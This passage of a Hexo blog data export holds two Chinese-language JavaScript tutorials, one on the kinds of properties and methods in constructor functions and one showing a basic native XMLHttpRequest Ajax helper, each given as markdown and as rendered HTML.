[剖析JS属性、方法](https://news.html5.qq.com/share/164582063261917465?url=http%3A%2F%2Fkuaibao.qq.com%2Fs%2F20180725A08BMB00&sh_sid=2__o9GiTuOu_QRC6DkXCyHHQgkLHmPo__2d72ce3ac1ca7644990ae3e313b788cb&ch=060000&qbredirect=&share=true&sc_id=uv6GTqC)\n\n玩转JavaScript，得有很扎实的基础，基础体现在哪？其中一个最重要的点就是对`JavaScript的属性和方法`有足够的了解和认识。这里，我会带大家一起来彻底消灭这些盲点（对JavaScript属性和方法的分类还存在模糊的印象）。\n\n### **一、属性**\nJS属性四种类型：`私有属性`，`原型属性`，`实例属性`，`类属性`。\n\n区别和使用：\n````\nvar a = function () {\n  var x = 'a'; // 私有属性\n  this.z = 'c'; // 实例属性\n}\na.y = 'b'; // 类属性\na.prototype.m = 'd'; // 原型属性\n````\n\n````\nvar t1 = new a();\nconsole.log(t1.x) // undefined [`实例`不能访问`私有变量`，私有变量只在`函数内`使用]\nconsole.log(t1.y) // undefined [`实例`不能访问`类属性`，类属性只有类本身才能访问，实例不能访问]\nconsole.log(t1.z) // c [`实例`访问`实例属性`]\nconsole.log(t1.m) // d [`实例`访问`原型属性`]\n\nconsole.log(a.x) // undefined [`类`不能访问`私有变量`，私有变量只在`函数内`使用]\nconsole.log(a.y) // b [`类属性`只有类本身才能访问]\nconsole.log(a.z) // undefined [`类`本身无法访问`实例属性`]\nconsole.log(a.m) // undefined [`类`本身无法访问`原型属性`]\n````\n\n**注意总结**\n\n1. `私有变量`只能在`函数内`使用。\n2. `实例属性`和`原型属性`拥有`相同变量`时，优先访问`实例属性`。\n3. 如上`变量y`，只有`类本身`才能访问`类属性，实例不能访问。\n\n### **二、方法**\n方法类型：`静态方法`，`实例方法`，`内部方法`\n\n\n1. 静态方法(不能被实例对象调用)\n````\nvar b = function() {}\nb.f1 = function() { // 定义一个`静态方法`\n  console.log('静态方法')\n}\nb.f1() // 静态方法\n\nvar c = new b()\nc.f1() // c.f1 is not a function\n````\n\n2. 实例方法(注意访问优先级)\n\nJS定义一个`实例方法`有三种方式：\n① 构造函数中使用`this`\n② 直接绑定在`实例`上\n③ 绑定在`原型`上\n````\nvar b = function() {\n  this.method1 = function() {\n    console.log('this')\n  }\n} // 构造函数`this`\n\nvar c = new b()\nc.method1 = function() {\n  console.log('instance')\n} // `实例`绑定\n\nb.prototype.method1 = function() {\n  console.log('prototype')\n} // `原型`绑定\n````\n**总结**\n\n上述代码展示了三种方式定义`实例方法`。\n\n**执行顺序:**`实例上绑定`的优先级高于`this上绑定`的，`this上绑定`的高于`原型上绑定`的实例方法。\n\n`实例上绑定` > `this上绑定` > `原型上绑定`\n\n3. 内部方法(只能内部调用)\n````\nvar b = function() {\n  var method1 = function() {\n    console.log('method1')\n  }\n  var method2 = function() {\n    console.log('method2')\n    method1()\n  }\n  this.method3 = function() {\n    method2()\n  }\n}\n\nvar c = new b()\nc.method1() // c.method1 is not a function\nc.method3() // method2 method1\n````\n上面代码定义了两个内部方法`method1`和`method2`。由运行结果可知，内部方法method1和method2`只能在函数内部调用`，外部通过实例对象无法找到该方法。\n\n## **最后总结一下：**\n通过这篇文章，我们知道了`属性的定义`，属性分`私有属性`，`原型属性`，`实例属性`，`类属性`，这`四种`，它们各自是怎么定义，及访问原则。同时我们也知道了`方法的定义`，方法分`静态方法`，`实例方法`，`内部方法`三种，主要注意一下它们的调用，及`实例方法的三种创建形式`。\n\n属性的定义[4种]  \n1· 私有属性  \n2· 原型属性  \n3· 实例属性  \n4· 类属性\n\n方法的定义[3种]  \n1· 静态方法  \n2· 实例方法  \n3· 内部方法  \n","slug":"FrontEnd/JS/剖析JS中Class 属性、方法","published":1,"updated":"2018-09-21T02:13:13.893Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzy00a3zodvvpx0pqm2","content":"<h2 id=\"剖析JS属性、方法\"><a href=\"#剖析JS属性、方法\" class=\"headerlink\" title=\"剖析JS属性、方法\"></a><a href=\"https://news.html5.qq.com/share/164582063261917465?url=http%3A%2F%2Fkuaibao.qq.com%2Fs%2F20180725A08BMB00&amp;sh_sid=2__o9GiTuOu_QRC6DkXCyHHQgkLHmPo__2d72ce3ac1ca7644990ae3e313b788cb&amp;ch=060000&amp;qbredirect=&amp;share=true&amp;sc_id=uv6GTqC\" target=\"_blank\" rel=\"noopener\">剖析JS属性、方法</a></h2><p>玩转JavaScript，得有很扎实的基础，基础体现在哪？其中一个最重要的点就是对<code>JavaScript的属性和方法</code>有足够的了解和认识。这里，我会带大家一起来彻底消灭这些盲点（对JavaScript属性和方法的分类还存在模糊的印象）。</p>\n<h3 id=\"一、属性\"><a href=\"#一、属性\" class=\"headerlink\" title=\"一、属性\"></a><strong>一、属性</strong></h3><p>JS属性四种类型：<code>私有属性</code>，<code>原型属性</code>，<code>实例属性</code>，<code>类属性</code>。</p>\n<p>区别和使用：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = function () &#123;</span><br><span class=\"line\">  var x = &apos;a&apos;; // 私有属性</span><br><span class=\"line\">  this.z = &apos;c&apos;; // 实例属性</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">a.y = &apos;b&apos;; // 类属性</span><br><span class=\"line\">a.prototype.m = &apos;d&apos;; // 原型属性</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var t1 = new a();</span><br><span class=\"line\">console.log(t1.x) // undefined [`实例`不能访问`私有变量`，私有变量只在`函数内`使用]</span><br><span class=\"line\">console.log(t1.y) // undefined [`实例`不能访问`类属性`，类属性只有类本身才能访问，实例不能访问]</span><br><span class=\"line\">console.log(t1.z) // c [`实例`访问`实例属性`]</span><br><span class=\"line\">console.log(t1.m) // d [`实例`访问`原型属性`]</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(a.x) // undefined [`类`不能访问`私有变量`，私有变量只在`函数内`使用]</span><br><span class=\"line\">console.log(a.y) // b [`类属性`只有类本身才能访问]</span><br><span class=\"line\">console.log(a.z) // undefined [`类`本身无法访问`实例属性`]</span><br><span class=\"line\">console.log(a.m) // undefined [`类`本身无法访问`原型属性`]</span><br></pre></td></tr></table></figure>\n<p><strong>注意总结</strong></p>\n<ol>\n<li><code>私有变量</code>只能在<code>函数内</code>使用。</li>\n<li><code>实例属性</code>和<code>原型属性</code>拥有<code>相同变量</code>时，优先访问<code>实例属性</code>。</li>\n<li>如上<code>变量y</code>，只有<code>类本身</code>才能访问`类属性，实例不能访问。</li>\n</ol>\n<h3 id=\"二、方法\"><a href=\"#二、方法\" class=\"headerlink\" title=\"二、方法\"></a><strong>二、方法</strong></h3><p>方法类型：<code>静态方法</code>，<code>实例方法</code>，<code>内部方法</code></p>\n<ol>\n<li><p>静态方法(不能被实例对象调用)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var b = function() &#123;&#125;</span><br><span class=\"line\">b.f1 = function() &#123; // 定义一个`静态方法`</span><br><span class=\"line\">  console.log(&apos;静态方法&apos;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">b.f1() // 静态方法</span><br><span class=\"line\"></span><br><span class=\"line\">var c = new b()</span><br><span class=\"line\">c.f1() // c.f1 is not a function</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>实例方法(注意访问优先级)</p>\n</li>\n</ol>\n<p>JS定义一个<code>实例方法</code>有三种方式：<br>① 构造函数中使用<code>this</code><br>② 直接绑定在<code>实例</code>上<br>③ 绑定在<code>原型</code>上<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var b = function() &#123;</span><br><span class=\"line\">  this.method1 = function() &#123;</span><br><span class=\"line\">    console.log(&apos;this&apos;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; // 构造函数`this`</span><br><span class=\"line\"></span><br><span class=\"line\">var c = new b()</span><br><span class=\"line\">c.method1 = function() &#123;</span><br><span class=\"line\">  console.log(&apos;instance&apos;)</span><br><span class=\"line\">&#125; // `实例`绑定</span><br><span class=\"line\"></span><br><span class=\"line\">b.prototype.method1 = function() &#123;</span><br><span class=\"line\">  console.log(&apos;prototype&apos;)</span><br><span class=\"line\">&#125; // `原型`绑定</span><br></pre></td></tr></table></figure></p>\n<p><strong>总结</strong></p>\n<p>上述代码展示了三种方式定义<code>实例方法</code>。</p>\n<p><strong>执行顺序:</strong><code>实例上绑定</code>的优先级高于<code>this上绑定</code>的，<code>this上绑定</code>的高于<code>原型上绑定</code>的实例方法。</p>\n<p><code>实例上绑定</code> &gt; <code>this上绑定</code> &gt; <code>原型上绑定</code></p>\n<ol>\n<li>内部方法(只能内部调用)<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var b = function() &#123;</span><br><span class=\"line\">  var method1 = function() &#123;</span><br><span class=\"line\">    console.log(&apos;method1&apos;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  var method2 = function() &#123;</span><br><span class=\"line\">    console.log(&apos;method2&apos;)</span><br><span class=\"line\">    method1()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  this.method3 = function() &#123;</span><br><span class=\"line\">    method2()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var c = new b()</span><br><span class=\"line\">c.method1() // c.method1 is not a function</span><br><span class=\"line\">c.method3() // method2 method1</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>上面代码定义了两个内部方法<code>method1</code>和<code>method2</code>。由运行结果可知，内部方法method1和method2<code>只能在函数内部调用</code>，外部通过实例对象无法找到该方法。</p>\n<h2 id=\"最后总结一下：\"><a href=\"#最后总结一下：\" class=\"headerlink\" title=\"最后总结一下：\"></a><strong>最后总结一下：</strong></h2><p>通过这篇文章，我们知道了<code>属性的定义</code>，属性分<code>私有属性</code>，<code>原型属性</code>，<code>实例属性</code>，<code>类属性</code>，这<code>四种</code>，它们各自是怎么定义，及访问原则。同时我们也知道了<code>方法的定义</code>，方法分<code>静态方法</code>，<code>实例方法</code>，<code>内部方法</code>三种，主要注意一下它们的调用，及<code>实例方法的三种创建形式</code>。</p>\n<p>属性的定义[4种]<br>1· 私有属性<br>2· 原型属性<br>3· 实例属性<br>4· 类属性</p>\n<p>方法的定义[3种]<br>1· 静态方法<br>2· 实例方法<br>3· 内部方法  </p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"剖析JS属性、方法\"><a href=\"#剖析JS属性、方法\" class=\"headerlink\" title=\"剖析JS属性、方法\"></a><a href=\"https://news.html5.qq.com/share/164582063261917465?url=http%3A%2F%2Fkuaibao.qq.com%2Fs%2F20180725A08BMB00&amp;sh_sid=2__o9GiTuOu_QRC6DkXCyHHQgkLHmPo__2d72ce3ac1ca7644990ae3e313b788cb&amp;ch=060000&amp;qbredirect=&amp;share=true&amp;sc_id=uv6GTqC\" target=\"_blank\" rel=\"noopener\">剖析JS属性、方法</a></h2><p>玩转JavaScript，得有很扎实的基础，基础体现在哪？其中一个最重要的点就是对<code>JavaScript的属性和方法</code>有足够的了解和认识。这里，我会带大家一起来彻底消灭这些盲点（对JavaScript属性和方法的分类还存在模糊的印象）。</p>\n<h3 id=\"一、属性\"><a href=\"#一、属性\" class=\"headerlink\" title=\"一、属性\"></a><strong>一、属性</strong></h3><p>JS属性四种类型：<code>私有属性</code>，<code>原型属性</code>，<code>实例属性</code>，<code>类属性</code>。</p>\n<p>区别和使用：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = function () &#123;</span><br><span class=\"line\">  var x = &apos;a&apos;; // 私有属性</span><br><span class=\"line\">  this.z = &apos;c&apos;; // 实例属性</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">a.y = &apos;b&apos;; // 类属性</span><br><span class=\"line\">a.prototype.m = &apos;d&apos;; // 原型属性</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var t1 = new a();</span><br><span class=\"line\">console.log(t1.x) // undefined [`实例`不能访问`私有变量`，私有变量只在`函数内`使用]</span><br><span class=\"line\">console.log(t1.y) // undefined [`实例`不能访问`类属性`，类属性只有类本身才能访问，实例不能访问]</span><br><span class=\"line\">console.log(t1.z) // c [`实例`访问`实例属性`]</span><br><span class=\"line\">console.log(t1.m) // d [`实例`访问`原型属性`]</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(a.x) // undefined [`类`不能访问`私有变量`，私有变量只在`函数内`使用]</span><br><span class=\"line\">console.log(a.y) // b [`类属性`只有类本身才能访问]</span><br><span class=\"line\">console.log(a.z) // undefined [`类`本身无法访问`实例属性`]</span><br><span class=\"line\">console.log(a.m) // undefined [`类`本身无法访问`原型属性`]</span><br></pre></td></tr></table></figure>\n<p><strong>注意总结</strong></p>\n<ol>\n<li><code>私有变量</code>只能在<code>函数内</code>使用。</li>\n<li><code>实例属性</code>和<code>原型属性</code>拥有<code>相同变量</code>时，优先访问<code>实例属性</code>。</li>\n<li>如上<code>变量y</code>，只有<code>类本身</code>才能访问`类属性，实例不能访问。</li>\n</ol>\n<h3 id=\"二、方法\"><a href=\"#二、方法\" class=\"headerlink\" title=\"二、方法\"></a><strong>二、方法</strong></h3><p>方法类型：<code>静态方法</code>，<code>实例方法</code>，<code>内部方法</code></p>\n<ol>\n<li><p>静态方法(不能被实例对象调用)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var b = function() &#123;&#125;</span><br><span class=\"line\">b.f1 = function() &#123; // 定义一个`静态方法`</span><br><span class=\"line\">  console.log(&apos;静态方法&apos;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">b.f1() // 静态方法</span><br><span class=\"line\"></span><br><span class=\"line\">var c = new b()</span><br><span class=\"line\">c.f1() // c.f1 is not a function</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>实例方法(注意访问优先级)</p>\n</li>\n</ol>\n<p>JS定义一个<code>实例方法</code>有三种方式：<br>① 构造函数中使用<code>this</code><br>② 直接绑定在<code>实例</code>上<br>③ 绑定在<code>原型</code>上<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var b = function() &#123;</span><br><span class=\"line\">  this.method1 = function() &#123;</span><br><span class=\"line\">    console.log(&apos;this&apos;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125; // 构造函数`this`</span><br><span class=\"line\"></span><br><span class=\"line\">var c = new b()</span><br><span class=\"line\">c.method1 = function() &#123;</span><br><span class=\"line\">  console.log(&apos;instance&apos;)</span><br><span class=\"line\">&#125; // `实例`绑定</span><br><span class=\"line\"></span><br><span class=\"line\">b.prototype.method1 = function() &#123;</span><br><span class=\"line\">  console.log(&apos;prototype&apos;)</span><br><span class=\"line\">&#125; // `原型`绑定</span><br></pre></td></tr></table></figure></p>\n<p><strong>总结</strong></p>\n<p>上述代码展示了三种方式定义<code>实例方法</code>。</p>\n<p><strong>执行顺序:</strong><code>实例上绑定</code>的优先级高于<code>this上绑定</code>的，<code>this上绑定</code>的高于<code>原型上绑定</code>的实例方法。</p>\n<p><code>实例上绑定</code> &gt; <code>this上绑定</code> &gt; <code>原型上绑定</code></p>\n<ol>\n<li>内部方法(只能内部调用)<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var b = function() &#123;</span><br><span class=\"line\">  var method1 = function() &#123;</span><br><span class=\"line\">    console.log(&apos;method1&apos;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  var method2 = function() &#123;</span><br><span class=\"line\">    console.log(&apos;method2&apos;)</span><br><span class=\"line\">    method1()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  this.method3 = function() &#123;</span><br><span class=\"line\">    method2()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var c = new b()</span><br><span class=\"line\">c.method1() // c.method1 is not a function</span><br><span class=\"line\">c.method3() // method2 method1</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>上面代码定义了两个内部方法<code>method1</code>和<code>method2</code>。由运行结果可知，内部方法method1和method2<code>只能在函数内部调用</code>，外部通过实例对象无法找到该方法。</p>\n<h2 id=\"最后总结一下：\"><a href=\"#最后总结一下：\" class=\"headerlink\" title=\"最后总结一下：\"></a><strong>最后总结一下：</strong></h2><p>通过这篇文章，我们知道了<code>属性的定义</code>，属性分<code>私有属性</code>，<code>原型属性</code>，<code>实例属性</code>，<code>类属性</code>，这<code>四种</code>，它们各自是怎么定义，及访问原则。同时我们也知道了<code>方法的定义</code>，方法分<code>静态方法</code>，<code>实例方法</code>，<code>内部方法</code>三种，主要注意一下它们的调用，及<code>实例方法的三种创建形式</code>。</p>\n<p>属性的定义[4种]<br>1· 私有属性<br>2· 原型属性<br>3· 实例属性<br>4· 类属性</p>\n<p>方法的定义[3种]<br>1· 静态方法<br>2· 实例方法<br>3· 内部方法  </p>\n"},{"title":"原生Ajax请求","date":"2018-04-16T08:01:01.000Z","archives":"原生Ajax请求","_content":"# 原生Ajax请求\n````\n    function ajax(options) {\n      options = options || {};\n      options.type = (options.type || \"GET\").toUpperCase();\n      options.dataType = options.dataType || \"json\";\n      var params = formatParams(options.data);\n\n      //创建 - 非IE6 - 第一步\n      if (window.XMLHttpRequest) {\n        var xhr = new XMLHttpRequest();\n      } else { //IE6及其以下版本浏览器\n        var xhr = new ActiveXObject('Microsoft.XMLHTTP');\n      }\n\n      //接收 - 第三步\n      xhr.onreadystatechange = function () {\n        if (xhr.readyState == 4) {\n          var status = xhr.status;\n          if (status >= 200 && status < 300) {\n            options.success && options.success(xhr.responseText, xhr.responseXML);\n          } else {\n            options.fail && options.fail(status);\n          }\n        }\n      }\n\n      //连接 和 发送 - 第二步\n      if (options.type == \"GET\") {\n        xhr.open(\"GET\", options.url + \"?\" + params, true);\n        xhr.send(null);\n      } else if (options.type == \"POST\") {\n        xhr.open(\"POST\", options.url, true);\n        //设置表单提交时的内容类型\n        xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        xhr.send(params);\n      }\n    }\n    \n    //格式化参数\n    function formatParams(data) {\n      var arr = [];\n      for (var name in data) {\n        arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name]));\n      }\n      arr.push((\"v=\" + Math.random()).replace(\".\", \"\"));\n      // console.log(arr.join(\"&\"));\n      return arr.join(\"&\");\n    }\n````","source":"_posts/FrontEnd/JS/原生Ajax请求.md","raw":"---\ntitle: 原生Ajax请求\ndate: 2018-04-16 16:01:01\ntags: 原生Ajax\narchives: 原生Ajax请求\ncategories: Ajax\n---\n# 原生Ajax请求\n````\n    function ajax(options) {\n      options = options || {};\n      options.type = (options.type || \"GET\").toUpperCase();\n      options.dataType = options.dataType || \"json\";\n      var params = formatParams(options.data);\n\n      //创建 - 非IE6 - 第一步\n      if (window.XMLHttpRequest) {\n        var xhr = new XMLHttpRequest();\n      } else { //IE6及其以下版本浏览器\n        var xhr = new ActiveXObject('Microsoft.XMLHTTP');\n      }\n\n      //接收 - 第三步\n      xhr.onreadystatechange = function () {\n        if (xhr.readyState == 4) {\n          var status = xhr.status;\n          if (status >= 200 && status < 300) {\n            options.success && options.success(xhr.responseText, xhr.responseXML);\n          } else {\n            options.fail && options.fail(status);\n          }\n        }\n      }\n\n      //连接 和 发送 - 第二步\n      if (options.type == \"GET\") {\n        xhr.open(\"GET\", options.url + \"?\" + params, true);\n        xhr.send(null);\n      } else if (options.type == \"POST\") {\n        xhr.open(\"POST\", options.url, true);\n        //设置表单提交时的内容类型\n        xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        xhr.send(params);\n      }\n    }\n    \n    //格式化参数\n    function formatParams(data) {\n      var arr = [];\n      for (var name in data) {\n        arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name]));\n      }\n      arr.push((\"v=\" + Math.random()).replace(\".\", \"\"));\n      // console.log(arr.join(\"&\"));\n      return arr.join(\"&\");\n    }\n````","slug":"FrontEnd/JS/原生Ajax请求","published":1,"updated":"2018-09-05T06:33:18.458Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0000a6zodvyr85gd0c","content":"<h1 id=\"原生Ajax请求\"><a href=\"#原生Ajax请求\" class=\"headerlink\" title=\"原生Ajax请求\"></a>原生Ajax请求</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ajax(options) &#123;</span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\">  options.type = (options.type || &quot;GET&quot;).toUpperCase();</span><br><span class=\"line\">  options.dataType = options.dataType || &quot;json&quot;;</span><br><span class=\"line\">  var params = formatParams(options.data);</span><br><span class=\"line\"></span><br><span class=\"line\">  //创建 - 非IE6 - 第一步</span><br><span class=\"line\">  if (window.XMLHttpRequest) &#123;</span><br><span class=\"line\">    var xhr = new XMLHttpRequest();</span><br><span class=\"line\">  &#125; else &#123; //IE6及其以下版本浏览器</span><br><span class=\"line\">    var xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //接收 - 第三步</span><br><span class=\"line\">  xhr.onreadystatechange = function () &#123;</span><br><span class=\"line\">    if (xhr.readyState == 4) &#123;</span><br><span class=\"line\">      var status = xhr.status;</span><br><span class=\"line\">      if (status &gt;= 200 &amp;&amp; status &lt; 300) &#123;</span><br><span class=\"line\">        options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        options.fail &amp;&amp; options.fail(status);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //连接 和 发送 - 第二步</span><br><span class=\"line\">  if (options.type == &quot;GET&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true);</span><br><span class=\"line\">    xhr.send(null);</span><br><span class=\"line\">  &#125; else if (options.type == &quot;POST&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;POST&quot;, options.url, true);</span><br><span class=\"line\">    //设置表单提交时的内容类型</span><br><span class=\"line\">    xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class=\"line\">    xhr.send(params);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//格式化参数</span><br><span class=\"line\">function formatParams(data) &#123;</span><br><span class=\"line\">  var arr = [];</span><br><span class=\"line\">  for (var name in data) &#123;</span><br><span class=\"line\">    arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;, &quot;&quot;));</span><br><span class=\"line\">  // console.log(arr.join(&quot;&amp;&quot;));</span><br><span class=\"line\">  return arr.join(&quot;&amp;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"原生Ajax请求\"><a href=\"#原生Ajax请求\" class=\"headerlink\" title=\"原生Ajax请求\"></a>原生Ajax请求</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ajax(options) &#123;</span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\">  options.type = 